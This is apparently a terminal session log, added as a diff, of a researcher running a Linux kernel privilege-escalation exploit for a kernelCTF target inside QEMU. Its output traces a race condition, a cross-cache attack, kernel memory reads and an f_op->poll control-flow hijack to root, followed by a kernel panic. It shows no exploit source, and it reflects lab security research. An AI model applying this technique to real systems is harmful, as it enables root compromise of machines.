@@ -1,0 +1,71 @@
+Script started on 2026-07-13 02:07:34+05:30 [TERM="xterm-256color" TTY="/dev/pts/10" COLUMNS="238" LINES="52"]
+]0;legion@fedora:/mnt/work/company/cyphermatrix/repos/bad-epoll-lab]3008;start=f3568257-f387-4784-90b8-c1c8b55947c5;machineid=547e491dc26a40e9bab540f21db5a485;user=legion;hostname=fedora;bootid=15758ced-1f19-47c5-ba50-892fcea978db;pid=00000000000000024117;type=shell;cwd=/mnt/work/company/cyphermatrix/repos/bad-epoll-lab\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\]7;file://fedora/mnt/work/company/cyphermatrix/repos/bad-epoll-lab\[?2004h]133;D;0\]133;A\[0m[1m[32mlegion@fedora[0m:[1m[32m/mnt/work/company/cyphermatrix/repos/bad-epoll-lab[0m$ ]133;B\[7mcd exploit/tier1[27m
+[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccd exploit/tier1
+[A
+[?2004l]133;C\]666;vte.shell.preexec!\]0;legion@fedora:/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1]3008;end=d3365f6d-7be6-4af0-b489-28f0c1689b8e;exit=success\]3008;start=f3568257-f387-4784-90b8-c1c8b55947c5;machineid=547e491dc26a40e9bab540f21db5a485;user=legion;hostname=fedora;bootid=15758ced-1f19-47c5-ba50-892fcea978db;pid=00000000000000024117;type=shell;cwd=/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\]7;file://fedora/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1\[?2004h]133;D;0\]133;A\[0m[1m[32mlegion@fedora[0m:[1m[32m/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1[0m$ ]133;B\[7m./start_qemu.sh[27m
+[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C./start_qemu.sh
+[A
+[?2004l]133;C\]666;vte.shell.preexec!\]0;legion@fedora:/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1]3008;end=20187c4f-190d-41d9-a0bb-6f417ac42e83;exit=success\]3008;start=f3568257-f387-4784-90b8-c1c8b55947c5;machineid=547e491dc26a40e9bab540f21db5a485;user=legion;hostname=fedora;bootid=15758ced-1f19-47c5-ba50-892fcea978db;pid=00000000000000024117;type=shell;cwd=/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\]7;file://fedora/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1\[?2004h]133;D;0\]133;A\[0m[1m[32mlegion@fedora[0m:[1m[32m/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1[0m$ ]133;B\[7mtail -f qemu_output.log[27m
+[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ctail -f qemu_output.log
+[A
+[?2004l]133;C\]666;vte.shell.preexec!\[env] cpuinfo MHz: 1895.995
+[+] target: kernelctf lts-6.12.67
+[*] KASLR leak bypassed (nokaslr assumed).
+[+] kernel_base=ffffffff81000000
+[*] Calibrated close() average: 4390 cycles, threshold set to: 150000 cycles
+[+] race setup done
+[*] racing close-vs-close...
+[*] racer: false-sharing window=134718 ns -> fire 67359 ns ahead
+[+] racer: stat done (10 iters) -> locked best range [7250,8750] (interrupts=24)
+[+] racer: stat done (10 iters) -> locked best range [250,1750] (interrupts=32)
+[+] race won: retries=3980 launch=1320 cc_retries=1
+[*] cross-cache...
+[+] cross-cache ok (init_task.comm=swapper)
+[*] AAR: find task (comm=exploit)...
+[+] task=ffff888003d98000
+[+] files=ffff888003da8000 fdt=ffff888006f0c6c0 fd_array=ffff8880046d5000
+[+] file=ffff8880077f9f00 pipe=ffff8880074a4840 bufs=ffff888006fe4400 page=ffffea00001dc440
+[+] vmemmap_base=ffffea0000000000 page_offset_base=ffff888000000000
+[+] rop_page virt=ffff888007711000
+[*] RIP: fire f_op->poll hijack (virt=ffff888007711000)...
+READY_FOR_GDB
+Win! UID: 0, GID: 0, EUID: 0
+[-] Segfault detected
+  Signal: 11 (Segmentation fault)
+  Faulting Address (si_addr): (nil)
+  Instruction Pointer (RIP):  0x40b865
+[   14.224208] Kernel panic - not syncing: Attempted to kill init! exitcode=0x00000100
+[   14.226229] CPU: 0 UID: 0 PID: 71 Comm: slowme Not tainted 6.12.67 #1
+[   14.226723] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.17.0-10.fc44 06/10/2025
+[   14.227460] Call Trace:
+[   14.228707]  <TASK>
+[   14.229229]  dump_stack_lvl+0x4d/0x70
+[   14.229965]  panic+0x10d/0x314
+[   14.230235]  ? sysvec_reschedule_ipi+0x21/0xf0
+[   14.230593]  do_exit.cold+0x41/0x41
+[   14.230885]  do_group_exit+0x28/0xb0
+[   14.231236]  get_signal+0x864/0x900
+[   14.231512]  ? pick_task_fair+0x44/0xc0
+[   14.231699]  arch_do_signal_or_restart+0x73/0x2a0
+[   14.231960]  syscall_exit_to_user_mode+0x95/0xe0
+[   14.232220]  do_syscall_64+0xab/0x1a0
+[   14.232477]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[   14.233070] RIP: 0033:0x59173b
+[   14.233673] Code: 73 01 c3 48 c7 c1 e8 ff ff ff f7 d8 64 89 01 48 83 c8 ff c3 66 2e 0f 1f 84 00 00 00 00 00 90 f3 0f 1e fa b8 18 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 e8 ff ff ff f7 d8 64 89 01 48
+[   14.235012] RSP: 002b:00007f517efcc0c8 EFLAGS: 00000246 ORIG_RAX: 0000000000000018
+[   14.235684] RAX: 0000000000000000 RBX: 0000000000000528 RCX: 000000000059173b
+[   14.236170] RDX: 0000000000000004 RSI: 0000000000000000 RDI: 0000000000000107
+[   14.236790] RBP: 0000000000000004 R08: 0000000000000000 R09: 0000000000000000
+[   14.237246] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000
+[   14.237676] R13: 00000000a10aadf1 R14: 0000000000000001 R15: 0000000000000244
+[   14.238161]  </TASK>
+[   14.239390] Kernel Offset: disabled
+[   14.240044] Rebooting in 1 seconds..
+
+^C
+]0;legion@fedora:/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1]3008;end=fcb95e0d-af44-4aef-9d0b-f4fc1667a3b2;exit=failure;status=130;signal=SIGINT\]3008;start=f3568257-f387-4784-90b8-c1c8b55947c5;machineid=547e491dc26a40e9bab540f21db5a485;user=legion;hostname=fedora;bootid=15758ced-1f19-47c5-ba50-892fcea978db;pid=00000000000000024117;type=shell;cwd=/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\]7;file://fedora/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1\[?2004h]133;D;130\]133;A\[0m[1m[32mlegion@fedora[0m:[1m[32m/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1[0m$ ]133;B\[7mexit[27m
+[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cexit
+[A
+[?2004l]133;C\]666;vte.shell.preexec!\exit
+
+Script done on 2026-07-13 02:09:15+05:30 [COMMAND_EXIT_CODE="130"]
